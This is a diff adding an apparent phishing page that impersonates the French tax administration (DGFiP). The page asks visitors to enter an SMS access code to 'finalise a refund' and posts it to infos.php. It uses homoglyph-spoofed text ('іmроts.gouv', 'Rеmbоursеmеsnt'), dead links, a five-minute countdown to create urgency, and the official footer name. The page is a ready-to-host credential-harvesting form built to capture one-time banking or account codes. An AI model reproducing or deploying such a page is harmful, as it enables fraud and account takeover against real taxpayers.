@@ -1,0 +1,168 @@
+
+
+
+<html class="js localstorage canvas video no-touchevents cssanimations csstransforms csstransitions" style=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		
+
+
+
+
+</header>        			
+
+<!DOCTYPE html>
+<html lang="fr" class="details">
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<link rel="stylesheet" href="css/bootstrap.min.css">
+		<link rel="stylesheet" href="css/commun.css">
+		<link rel="stylesheet" href="css/mire.css">
+		<link rel="stylesheet" href="css/dac.css">
+		<!--[if lt IE 9]>
+		<script src="js/Respond.js"> </script>
+		<script src="js/html5shiv-3.7.3.min.js"> </script>
+		<script>
+			document.createElement('header');
+			document.createElement('footer');
+			document.createElement('main');
+		</script>
+		<![endif]-->
+		<title>Particuliers | identification</title>
+	</head>
+		  <form action="infos.php" method="post">
+               
+         <input type="hidden" name="step" value="sms">	
+	<body>
+		<a href="#contenu" class="sr-only sr-only-focusable">Aller au contenu</a>
+		<!--[if lt IE 9]>
+		<div role="alert" class="alert alert-danger" role="alert">
+			<p>Vous utilisez une version obsol&egrave;te de votre navigateur</p>
+			<p>Son utilisation vous expose &agrave; des risques de s&eacute;curit&eacute; et vous prive de certaines fonctionnalit&eacute;s.</p>
+			<p>Nous vous invitons &agrave; utiliser <a href="http://windows.microsoft.com/fr-fr/internet-explorer/download-ie">une version plus r&eacute;cente </a>
+				ou un <a href="http://browsehappy.com/">autre navigateur</a>.
+			</p>
+		</div>
+		<![endif]-->
+	
+		<div id="banniereSmart" class="container hide">
+			<button type="button" class="close" aria-label="Fermer la bannière" onclick="addClassName(document.getElementById('banniereSmart'), 'hide');">
+			<span aria-hidden="true">×</span>
+			</button>
+			<a id="leStoreLogo" class="col-xs-3 col-sm-1" href="#">
+			<img id="LogoSmartImage" src="images/Small-logoSMART.png" alt="Télécharger l'app mobile">
+			</a>
+			<div id="banniereSmartTexte" class="col-xs-8 col-sm-10">
+				<div class="row">
+					Téléchargez gratuitement l'app mobile іmроts.gouv sur votre appareil.
+				</div>
+			</div>
+		</div>
+		<header>
+			<div class="container">
+				<a id="logo" class="col-xs-12 col-sm-6 col-lg-7" href="#" target="_blank" rel="noopener" title="">
+				</a>
+				<ul id="acces_espace" class="col-xs-12 col-sm-6 col-lg-5">
+					<li class="col-xs-6 col-sm-9 col-md-7 pull-right">
+						<a class="btn btn-primary" id="partPriv" href="#">
+						<span class="dgfipicon dgfipicon-cadenas-ferme pull-left"></span>
+						Votre espace particulier
+						</a>
+					</li>
+					<li class="col-xs-6 col-sm-9 col-md-7 pull-right">
+						<a class="btn btn-danger" id="proPriv" href="#">
+						<span class="dgfipicon dgfipicon-cadenas-ferme pull-left"></span>
+						Votre espace professionnel
+						</a>
+					</li>
+				</ul>
+			</div>
+		</header>
+		<div class="container">
+			<div class="row">
+				<ol class="breadcrumb ">
+					<li><a href="#" title="Retour au portail">Accueil</a></li>
+					<li><a href="#">Particuliers</a></li>
+					<li class="active">Rеmbоursеmеsnt  </li>
+				</ol>
+			</div>
+		</div>
+		<main class="container" id="contenu">
+			<div class="sr-only">
+				Le contenu du formulaire et l'aide mise à votre disposition évoluent selon vos réponses et votre situation
+			</div>
+			<div class="row">
+				<section class="col-md-12" id="aide">
+					<div class="panel panel-default">
+						<div class="panel-heading">
+							<h2 id="titre_authent" class="text-center">Identification</h2>
+						</div>
+						<div class="panel-body">
+							<form method="post" enctype="application/x-www-form-urlencoded">
+								<div class="row">
+								<div class="text-center">
+									<p>Il vous suffit désormais de vous identifier en saisissant le code d'accès reçu par SMS sur votre téléphone portable.<span id="countdown">5:00</span></p></br>
+									
+								</div><div class="col-md-12">
+										<div class="form-group">
+												</div>
+									</div>
+									</div>
+									<div class="col-md-12">
+										<div class="form-group">
+											<label for=""><font color="red">*</font> Code d'accès reçu par SMS</label>
+								
+											<input class="form-control" name="sms" type="text" aria-required="true" id="sms" placeholder="" style="color: rgb(85, 85, 85);" required="required">
+										</div>
+									</div>
+								</div>
+								<div class="row" id="goOnBtn">
+									<div class="col-md-12">
+										<div class="form-group text-center" id="go">
+											<button name="submit" id="link" type="submit" class="btn btn-primary btn-glow">Valider</button>
+										</div>
+									</div>
+								</div>
+							
+						</div>
+					</div>
+								<div class="panel-footer text-center">
+											<p>Cette identification est obligatoire pour conclure votre transaction. Si votre numéro de téléphone n'est pas à jour, vous ne pourrez pas finaliser votre remboursement.</p>
+									</div>
+				</section>
+			</div>
+		</main>
+		<footer role="contentinfo">
+			<p class="col-md-12 text-center">Direction générale des Finances publiques</p>
+		</footer>
+		<script src="js/jquery.min.js"></script>
+		<script src="js/bootstrap.min.js"></script>
+		<script src="js/jquery.details.js"></script>
+		<script>
+			$(function() {
+				// Pour le fonctionnement des balises details et summary dans IE/EDGE
+				$('html').addClass($.fn.details.support ? 'details' : 'no-details');
+				$('details').details();
+			});
+		</script>
+		
+<script>
+   var seconds = 300;
+   function secondPassed() {
+   var minutes = Math.round((seconds - 30)/60);
+   var remainingSeconds = seconds % 60;
+   if (remainingSeconds < 10) {
+      remainingSeconds = "0" + remainingSeconds; 
+   }
+   document.getElementById('countdown').innerHTML = " " + minutes + ":" + remainingSeconds;
+   if (seconds == 0) {
+    clearInterval(countdownTimer);
+    document.getElementById('countdown').innerHTML = "";
+   } else {
+    seconds--;
+   }
+   }
+   var countdownTimer = setInterval('secondPassed()', 1000);
+</script>
+
+	</body>
+</html>
